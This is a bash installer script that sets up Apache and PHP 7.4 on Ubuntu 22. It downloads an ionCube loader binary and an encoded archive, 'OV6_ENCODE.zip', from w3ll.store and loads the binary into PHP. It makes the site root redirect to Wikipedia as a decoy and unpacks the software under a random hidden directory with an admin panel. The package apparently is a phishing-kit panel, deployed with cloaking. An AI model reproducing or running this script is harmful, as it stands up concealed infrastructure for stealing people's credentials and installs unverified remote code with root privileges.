#!/bin/bash

# Color Definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Check OS Version
if [[ -f /etc/os-release ]]; then
    OS_NAME=$(grep '^NAME=' /etc/os-release 2>/dev/null | awk -F'=' '{print $2}' | tr -d '"')
    OS_VERSION=$(grep '^VERSION_ID=' /etc/os-release 2>/dev/null | awk -F'=' '{print $2}' | tr -d '"' | cut -d '.' -f 1)
else
    OS_NAME=""
    OS_VERSION=""
fi

if [[ "$OS_NAME" != "Ubuntu" ]] || [[ "$OS_VERSION" != "22" ]]; then
    echo -e "${RED}This script is designed for ${YELLOW}Ubuntu 22${RED}. Please install ${YELLOW}Ubuntu 22${RED} to proceed.${RESET}"
    exit 1
fi

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}This script must be run as root or with sudo privileges, so run ${YELLOW}sudo bash install.sh${RESET}"
    exit 1
fi

# Ask for domain name
echo -ne "Enter your domain name (${YELLOW}without www, e.g., example.com${RESET}): ${BLUE}"
read domain
echo -e "${RESET}"

if [[ -z "$domain" ]]; then
    echo -e "${RED}Domain name cannot be empty.${RESET}"
    exit 1
fi

# Check dependencies
for dep in wget unzip uuidgen; do
    command -v $dep >/dev/null 2>&1 || {
        echo -e "${RED}Error: $dep is not installed. ${YELLOW}Attempting to install...${BLUE}" >&2;
        sudo apt-get update -qq && sudo apt-get install -y $dep || {
            echo -e "${RED}Failed to install $dep.${RESET}" >&2;
            exit 1;
        };
    }
done

# Update package list
echo -e "${BLUE}"
sudo apt-get update -y
sudo apt-get upgrade -y
sudo add-apt-repository universe
sudo add-apt-repository ppa:ondrej/php
sudo apt-get update -y
sudo apt-get upgrade -y

# Install Apache
sudo apt-get install -y apache2
sudo systemctl start apache2
sudo systemctl enable apache2

# Enable Apache modules
sudo a2enmod rewrite
sudo a2enmod headers

# Create a virtual host configuration file for the domain
sudo tee /etc/apache2/sites-available/${domain}.conf > /dev/null <<EOL
<VirtualHost *:80>
    ServerAdmin webserver@${domain}
    ServerName ${domain}
    DocumentRoot /var/www/${domain}

    ErrorLog \${APACHE_LOG_DIR}/${domain}_error.log
    CustomLog \${APACHE_LOG_DIR}/${domain}_access.log combined

    <Directory /var/www/${domain}>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
EOL

# Enable the virtual host
sudo a2ensite ${domain}.conf

# Install PHP 7.4 and required extensions
echo -e "${BLUE}"
sudo apt install -y php7.4 libapache2-mod-php7.4 php7.4-cli php7.4-fpm php7.4-json php7.4-common php7.4-mysql php7.4-zip php7.4-gd php7.4-mbstring php7.4-curl php7.4-xml php7.4-bcmath

# Download ionCube Loader
wget https://w3ll.store/operators/ioncube_loader_lin_7.4.so

# Find PHP Extension Directory and PHP Configuration File
EXT_DIR=$(php -i | grep extension_dir | head -n 1 | sed -e 's/.*=> //g')
INI_FILE=$(php --ini | grep "Loaded Configuration File" | sed -e 's/.*: //g')
APACHE_INI=$(echo /etc/php/$(php -v | head -n 1 | cut -d ' ' -f 2 | cut -f1,2 -d'.')/apache2/php.ini)

# Move ionCube Loader
mv ioncube_loader_lin_7.4.so $EXT_DIR

# Update php.ini file
echo "zend_extension = $EXT_DIR/ioncube_loader_lin_7.4.so" | sudo tee -a $INI_FILE
echo "zend_extension = $EXT_DIR/ioncube_loader_lin_7.4.so" | sudo tee -a $APACHE_INI

# Download the software
wget https://w3ll.store/operators/OV6_ENCODE.zip

# Generate a random directory name
random_string=$(uuidgen)
mkdir "$random_string"
mkdir /var/www/${domain}

# Create and write the redirect script to index.php
echo "<?php header('Location: https://www.wikipedia.org/'); exit();" | sudo tee /var/www/${domain}/index.php > /dev/null

# Extract the software directly into the generated directory
unzip OV6_ENCODE.zip -d "/var/www/${domain}/${random_string}"

# Check for .htaccess and alert if not present
if [[ ! -f "/var/www/${domain}/${random_string}/O V 6/.htaccess" ]]; then
    echo -e "${YELLOW}Warning: .htaccess file is missing in the archive.${RESET}"
else
    # Explicitly move .htaccess
    mv "/var/www/${domain}/${random_string}/O V 6/.htaccess" "/var/www/${domain}/${random_string}/"
fi

# Move other contents of 'O V 6' one level up
mv "/var/www/${domain}/${random_string}/O V 6/"* "/var/www/${domain}/${random_string}/"

# Remove the empty 'O V 6' directory
rm -r "/var/www/${domain}/${random_string}/O V 6"

# Clean up
rm OV6_ENCODE.zip

# Set permissions
chown -R www-data:www-data /var/www/${domain}/${random_string}

# Restart Apache to apply all changes
sudo systemctl restart apache2
sudo systemctl start php7.4-fpm
sudo a2enmod proxy
sudo a2enmod proxy_fcgi
sudo a2enmod setenvif
sudo apachectl configtest
sudo systemctl restart apache2
sudo systemctl restart php7.4-fpm

# Display installation completion message
echo -e "${GREEN}Installation completed successfully, please visit: ${YELLOW}https://${domain}/${random_string}/admin${GREEN} to set your details.${RESET}"
